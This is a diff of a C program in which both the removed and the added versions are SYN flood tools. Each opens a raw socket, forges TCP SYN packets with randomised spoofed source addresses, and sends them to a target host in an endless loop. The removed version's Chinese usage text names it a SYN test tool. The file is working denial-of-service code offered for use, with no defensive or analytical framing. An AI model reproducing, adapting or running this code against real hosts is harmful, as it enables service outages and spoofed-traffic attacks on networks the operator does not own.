@@ -1,121 +1,106 @@
-#include <stdlib.h>
-#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <netinet/ip.h>
-#include <linux/tcp.h>
-struct pstcphdr {
-	__be32    saddr;
-	__be32    daddr;
-	__be16    proto;
-	__be16    tcplen;
-};
-struct tcpoptions 
-{
-	__be32    mss;
-	__be16    nop2;
-	__be16    sack;
-	__be32    scale;
-};
+#include <sys/socket.h> 
+#include <string.h>
+#include <netinet/in.h> 
+#include <netinet/ip.h> 
+#include <netinet/tcp.h> 
+#include <stdlib.h> 
+#include <errno.h> 
+#include <unistd.h> 
+#include <stdio.h> 
+#include <netdb.h>
+#define DESTPORT 2288
+#define LOCALPORT 8888   
+void send_tcp(int sockfd,struct sockaddr_in *addr); 
 unsigned short check_sum(unsigned short *addr,int len);
-int main(int argc, char *argv[])
-{
-	if( argc == 1 )
-	{
-		printf("这是一个syn测试工具，命令格式./synflood ip port \n");
-		exit(0);
-	}
-	else if( argc > 3 )
-	{
-		printf("参数输入太多啦，请不带参数查看输入格式！\n");
-		exit(0);
-	}
-	else if( argc < 3 )
-	{
-		printf("参数输入太少啦，请不带参数查看输入格式！\n");
-		exit(0);
-	}
-	const int on=1;
-	/*char ipadd[20]=("192.168.1.10");*/
-	srand(clock());
-	/*struct sockaddr_in srcaddress;*/
-	struct sockaddr_in dstaddress;
-	struct pstcphdr *pstcphdr1;
-	struct iphdr *iphead;
-	struct tcphdr *tcp;
-	struct tcpoptions *tcpopt;
-	dstaddress.sin_family=AF_INET;
-	dstaddress.sin_port=htons(atoi(argv[2]));
-	dstaddress.sin_addr.s_addr = inet_addr(argv[1]);
-
-
-	int sk=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
-	setsockopt(sk,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
-	char buf[128]={0};
-	int ip_len;
-
-	ip_len = sizeof(*iphead)+sizeof(*tcp)+sizeof(*tcpopt);
-	iphead=(struct iphdr*)buf;
-	tcp=(struct tcphdr *)(buf+sizeof(*iphead));
-	tcpopt=(struct tcpoptions*)(buf+sizeof(*iphead)+sizeof(*tcp));
-	iphead->version= 4;
-	iphead->ihl=sizeof(*iphead)/4;
-	iphead->tos=0;
-	iphead->tot_len=htons(ip_len);
-	iphead->id=0;
-	iphead->frag_off=0;
-	iphead->protocol=6;
-	iphead->check=0;
-	inet_aton(argv[1],&iphead->daddr);
-
-	int tcplen=sizeof(*tcp)+sizeof(*tcpopt);
-	tcp->dest=htons(atoi(argv[2]));
-	tcp->doff=tcplen/4;
-	tcp->syn=1;
-	tcp->check=0;
-	tcp->window=htons(8196);
-
-	tcpopt->mss=htonl(0x020405b4);
-	tcpopt->nop2=htons(0x0101);
-	tcpopt->sack=htons(0x0402);
-	tcpopt->scale=htonl(0x01030309);
-
-	pstcphdr1=(struct pstcphdr*)(buf+sizeof(*iphead)+sizeof(*tcp)+sizeof(*tcpopt));
-	pstcphdr1->daddr=&iphead->daddr;
-	pstcphdr1->proto=htons(6);
-	pstcphdr1->tcplen=htons(sizeof(*tcp));
-	while (1)
-	{
-		tcp->seq=rand();
-		iphead->ttl=random()%98+30;
-		iphead->saddr=htonl((rand()%3758096383));
-		pstcphdr1->saddr=&iphead->saddr;
-		tcp->source=htons(rand()%65535);
-		tcp->check=check_sum((unsigned short*)tcp,sizeof(*tcp)+sizeof(*tcpopt)+sizeof(*pstcphdr1));
-
-		sendto(sk,buf,ip_len,0,&dstaddress,sizeof(struct sockaddr_in));
-	}
+int main(int argc,char **argv) 
+{ 
+        int sockfd; 
+        struct sockaddr_in addr; 
+        struct hostent *host; 
+        int on=1;
+        if(argc!=2) 
+        { 
+                fprintf(stderr,"Usage:%s hostnamena",argv[0]); 
+                exit(1); 
+        }
+        bzero(&addr,sizeof(struct sockaddr_in)); 
+        addr.sin_family=AF_INET; 
+        addr.sin_port=htons(DESTPORT);
+        if(inet_aton(argv[1],&addr.sin_addr)==0) 
+        { 
+                host=gethostbyname(argv[1]); 
+                if(host==NULL) 
+                { 
+                        fprintf(stderr,"HostName Error:%sna",hstrerror(h_errno)); 
+                        exit(1); 
+                } 
+                addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]); 
+        }
+        sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
+        if(sockfd<0) 
+        { 
+                fprintf(stderr,"Socket Error:%sna",strerror(errno)); 
+                exit(1); 
+        } 
+        setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
+        setuid(getpid());
+        send_tcp(sockfd,&addr); 
 }
 
-unsigned short check_sum(unsigned short *addr,int len){
-	register int nleft=len;
-	register int sum=0;
-	register short *w=addr;
-	short answer=0;
-
-	while(nleft>1)
-	{
-		sum+=*w++;
-		nleft-=2;
-	}
-	if(nleft==1)
-	{
-		*(unsigned char *)(&answer)=*(unsigned char *)w;
-		sum+=answer;
-	}
-
-	sum=(sum>>16)+(sum&0xffff);
-	sum+=(sum>>16);
-	answer=~sum;
-	return(answer);
+void send_tcp(int sockfd,struct sockaddr_in *addr) 
+{ 
+        char buffer[100]; 
+        struct ip *ip; 
+        struct tcphdr *tcp; 
+        int head_len;
+        head_len=sizeof(struct ip)+sizeof(struct tcphdr);
+        bzero(buffer,100);
+        ip=(struct ip *)buffer; 
+        ip->ip_v=IPVERSION; 
+        ip->ip_hl=sizeof(struct ip)>>2;  
+        ip->ip_tos=0; 
+        ip->ip_len=htons(head_len); 
+        ip->ip_id=0; 
+        ip->ip_off=0;  
+        ip->ip_ttl=MAXTTL;  
+        ip->ip_p=IPPROTO_TCP;  
+        ip->ip_sum=0;  
+        ip->ip_dst=addr->sin_addr; 
+        tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
+        tcp->source=htons(LOCALPORT); 
+        tcp->dest=addr->sin_port; 
+        tcp->seq=random(); 
+        tcp->ack_seq=0; 
+        tcp->doff=5; 
+        tcp->syn=1; 
+        tcp->check=0;
+        while(1) 
+        { 
+                ip->ip_src.s_addr=random();  
+                tcp->check=check_sum((unsigned short *)tcp, 
+                                sizeof(struct tcphdr)); 
+                sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
+        sleep(1);
+        } 
 }
+unsigned short check_sum(unsigned short *addr,int len) 
+{ 
+        register int nleft=len; 
+        register int sum=0; 
+        register short *w=addr; 
+        short answer=0;
+        while(nleft>1) 
+        { 
+                sum+=*w++; 
+                nleft-=2; 
+        } 
+        if(nleft==1) 
+        { 
+                *(unsigned char *)(&answer)=*(unsigned char *)w; 
+                sum+=answer; 
+        }
+        sum=(sum>>16)+(sum&0xffff); 
+        sum+=(sum>>16); 
+        answer=~sum; 
+        return(answer); 
+} 
